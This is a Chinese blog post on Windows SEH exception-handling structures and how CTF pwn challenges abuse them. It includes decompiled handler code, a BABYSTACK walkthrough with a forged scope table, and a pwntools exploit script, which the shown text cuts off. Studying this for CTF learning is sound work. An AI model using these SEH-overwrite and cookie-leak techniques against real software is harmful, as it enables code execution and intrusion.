<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2019-10-07-SEH的概念及基本知识 - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SEH相关数据结构"><span class="toc-text">SEH相关数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-TIB结构"><span class="toc-text">1. TIB结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-EXCEPTION-REGISTRATION-RECORD-结构"><span class="toc-text">2. _EXCEPTION_REGISTRATION_RECORD 结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SEH-scope-table结构"><span class="toc-text">3. SEH scope table结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-其他"><span class="toc-text">4. 其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#示例"><span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-BABYSTACK"><span class="toc-text">1.BABYSTACK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-第五空间决赛-“九果”"><span class="toc-text">2. 第五空间决赛-“九果”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2019SUCTF-babystack"><span class="toc-text">3. 2019SUCTF-babystack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2019-10-07-SEH的概念及基本知识
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2019-10-07 21:45:00</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>文章首发于<a href="https://www.anquanke.com/post/id/188170" target="_blank" rel="noopener">安全客</a></p>
<p>目前我在CTF中遇到的windows pwn题目，利用手法大多是通过伪造SEH结构体，再触发异常来getshell。之前没有太多的做这方面的题，这里我详细说一下原理和解题思路</p>
<p>系统主要依靠SEH机制(用户模式、内核模式)和VEH机制（仅支持用户模式）进行异常处理。下面先主要了解一下SEH机制。</p>
<h2 id="SEH相关数据结构"><a href="#SEH相关数据结构" class="headerlink" title="SEH相关数据结构"></a>SEH相关数据结构</h2><h3 id="1-TIB结构"><a href="#1-TIB结构" class="headerlink" title="1. TIB结构"></a>1. TIB结构</h3><p>TIB，又称线程信息块，是保存线程基本信息的数据结构，它位于TEB的头部。TEB是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的TEB。</p>
<p>TIB结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Exceptionlist</span>;</span><span class="comment">//指向异常处理链表</span></span><br><span class="line">	PVOID StackBase;<span class="comment">//当前进程所使用的栈的栈底</span></span><br><span class="line">	PVOID StackLimit;<span class="comment">//当前进程所使用的栈的栈顶</span></span><br><span class="line">	PVOID SubSystemTib;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		PVOID FiberData;</span><br><span class="line">		ULONG Version;</span><br><span class="line">	&#125;;</span><br><span class="line">	PVOID ArbitraryUserPointer;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span><span class="comment">//指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure></p>
<p>在这个结构中与异常处理有关的第一个成员：指向<code>_EXCEPTION_REGISTRATION_RECORD</code>结构的<code>Exceptionlist</code>指针</p>
<h3 id="2-EXCEPTION-REGISTRATION-RECORD-结构"><a href="#2-EXCEPTION-REGISTRATION-RECORD-结构" class="headerlink" title="2. _EXCEPTION_REGISTRATION_RECORD 结构"></a>2. _EXCEPTION_REGISTRATION_RECORD 结构</h3><p>该结构主要用于描述线程异常处理过程的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系</p>
<p>结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//指向下一个结构的指针</span></span><br><span class="line">	PEXCEPTION_ROUTINE Handler;<span class="comment">//当前异常处理回调函数的地址</span></span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
<p>结构如图所示：<br><img src="https://s2.ax1x.com/2019/10/09/uI9Auq.png" alt></p>
<p>伪造之后的这个结构体中的<code>*Next</code>必须是原来的，所以我们要事先泄露出来原<code>*Next</code></p>
<h3 id="3-SEH-scope-table结构"><a href="#3-SEH-scope-table结构" class="headerlink" title="3. SEH scope table结构"></a>3. SEH scope table结构</h3><p>在Scope table中保存了<code>__try</code>块相匹配的 <code>__except</code> 或 <code>__finally</code>的地址值<br>结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct _EH4_SCOPETABLE &#123;</span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[1];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct _EH4_SCOPETABLE_RECORD &#123;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        long (*FilterFunc)();</span><br><span class="line">            union &#123;</span><br><span class="line">            void (*HandlerAddress)();</span><br><span class="line">            void (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如图所示：<br><img src="https://s2.ax1x.com/2019/10/09/uIpn1A.png" alt></p>
<p>windows pwn的关键就是伪造<code>scope table</code>结构体，它地址位于栈上的位置在<code>ebp-0x8</code>，存的值是和<code>___security_cookie</code>异或之后的结果，所以我们要想伪造它，就必须先泄露出来<code>___security_cookie</code>的值</p>
<p>该把<code>scope table</code>结构体伪造成什么呢？<br>当程序触发异常后，会执行类似这样的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00401B50                 push    ebp</span><br><span class="line">.text:00401B51                 mov     ebp, esp</span><br><span class="line">.text:00401B53                 mov     eax, [ebp+arg_C]</span><br><span class="line">.text:00401B56                 push    eax</span><br><span class="line">.text:00401B57                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:00401B5A                 push    ecx</span><br><span class="line">.text:00401B5B                 mov     edx, [ebp+arg_4]</span><br><span class="line">.text:00401B5E                 push    edx</span><br><span class="line">.text:00401B5F                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:00401B62                 push    eax</span><br><span class="line">.text:00401B63                 push    offset j_@__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401B68                 push    offset ___security_cookie</span><br><span class="line">.text:00401B6D                 call    _except_handler4_common</span><br><span class="line">.text:00401B72                 add     esp, 18h</span><br><span class="line">.text:00401B75                 pop     ebp</span><br><span class="line">.text:00401B76                 retn</span><br><span class="line">.text:00401B76 SEH_4013A0      endp</span><br></pre></td></tr></table></figure></p>
<p>上述代码中调用了<code>_except_handler4_common</code>，那么在<code>_except_handler4_common</code>函数中干了些什么呢？接着往下看…</p>
<p>该代码段参考：<a href="http://www.jbox.dk/sanos/source/win32/msvcrt/except.c.html" target="_blank" rel="noopener">except.c</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">ValidateLocalCookies</span><span class="params">(<span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EH4_SCOPETABLE *scopeTable, <span class="keyword">char</span> *framePointer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// esi@2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// esi@3</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( scopeTable-&gt;GSCookieOffset != <span class="number">-2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];</span><br><span class="line">        __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">        ((<span class="keyword">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];</span><br><span class="line">    __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">    ((<span class="keyword">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v4);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> __cdecl _except_handler4_common(<span class="keyword">unsigned</span> <span class="keyword">int</span> *securityCookies, <span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="keyword">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 异或解密 scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span></span><br><span class="line">    framePointer = (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 验证 GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="keyword">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 调用 FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// 调用 HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在函数中先后调用了<code>scope table</code>结构体中的<code>FilterFunc</code>函数和<code>HandlerFunc</code>函数，那么我们就可以伪造这两个函数地址为我们的shell代码地址，当触发异常时就会执行shell代码，即可获取到shell</p>
<h3 id="4-其他"><a href="#4-其他" class="headerlink" title="4. 其他"></a>4. 其他</h3><p>通过查看汇编我们发现在栈上还有一个特殊的值，位置在<code>ebp-0x1c</code>处<br><img src="https://s2.ax1x.com/2019/10/09/uIFey9.png" alt></p>
<p>而<code>scope table</code>结构体地址在它的下面，所以我们必须还要伪造这个值。伪造它由两种方法，第一种把他泄露出来，构造payload的时候再填充进去即可；另一种方法就是计算出来：<code>值=___security_cookie^ebp</code></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="1-BABYSTACK"><a href="#1-BABYSTACK" class="headerlink" title="1.BABYSTACK"></a>1.<code>BABYSTACK</code></h3><p>该题目是一个windows平台下的pwn，利用的正是覆盖SEH结构体来getshell，载入IDA中看代码流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// ST38_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+20h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+24h] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+44h] [ebp-9Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+C8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  v3 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">  setvbuf(v3, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setvbuf(v4, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ouch! Do not kill me , I will tell you everything"</span>);</span><br><span class="line">  sub_401420(<span class="string">"stack address = 0x%x\n"</span>, &amp;v9);</span><br><span class="line">  sub_401420(<span class="string">"main address = 0x%x\n"</span>, main);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Do you want to know more?"</span>);</span><br><span class="line">    sub_401000((<span class="keyword">int</span>)&amp;v9, <span class="number">10</span>);</span><br><span class="line">    v7 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"yes"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      v7 = -(v7 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"no"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">        v6 = -(v6 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_401000((<span class="keyword">int</span>)&amp;v9, <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Where do you want to know"</span>);</span><br><span class="line">      v5 = (_DWORD *)sub_401060();</span><br><span class="line">      sub_401420(<span class="string">"Address 0x%x value is 0x%x\n"</span>, v5, *v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I can tell you everything, but I never believe 1+1=2"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"AAAA, you kill me just because I don't think 1+1=2??"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审计之后发现<code>sub_401000((int)&amp;v9, 256);</code>存在栈溢出，能够覆盖到<code>ebp</code>的位置</p>
<p>并且在看main的汇编时发现一个<code>shell</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0040138D                 push    offset Command  ; &quot;cmd&quot;</span><br><span class="line">.text:00401392                 call    ds:system</span><br></pre></td></tr></table></figure>
<p>程序提供给我们<code>v9</code>在栈上的地址和<code>main</code>函数的地址</p>
<p>根据程序已经提供给我们的信息，下面描述具体攻击流程：</p>
<ul>
<li>泄露<code>___security_cookie</code>，它的地址可以通过相对于<code>main函数</code>的偏移计算出来：<code>main_addr+0x2f54</code></li>
<li>泄露<code>_EXCEPTION_REGISTRATION_RECORD</code>结构体中<code>Next</code>成员：<code>ebp-0x10</code></li>
<li>泄露<code>GS</code>的值，它的地址在<code>ebp-0x1c</code>，可以通过<code>&amp;v9</code>偏移计算出来：<code>&amp;v9+0x80</code></li>
<li>伪造<code>hardler</code>结构体</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br></pre></td></tr></table></figure>
<ul>
<li>通过栈溢出对内存进行覆盖</li>
<li>使程序异常来触发执行伪造的代码段</li>
</ul>
<p>Exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">ip = <span class="string">'192.168.1.103'</span></span><br><span class="line">prot = <span class="string">'1234'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':'</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line">r = remote(ip,prot)</span><br><span class="line">ru(<span class="string">"stack address = "</span>)</span><br><span class="line">stack_addr = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line">ru(<span class="string">"main address = "</span>)</span><br><span class="line">main_addr = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"main_addr"</span>,main_addr)</span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"yes"</span>)</span><br><span class="line">ru(<span class="string">"Where do you want to know"</span>)</span><br><span class="line">___security_cookie_addr = main_addr+<span class="number">0x2f54</span></span><br><span class="line"></span><br><span class="line">sl(str(___security_cookie_addr))</span><br><span class="line">ru(<span class="string">"value is "</span>)</span><br><span class="line">___security_cookie_value = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"___security_cookie_value"</span>,___security_cookie_value)</span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"yes"</span>)</span><br><span class="line">ru(<span class="string">"Where do you want to know"</span>)</span><br><span 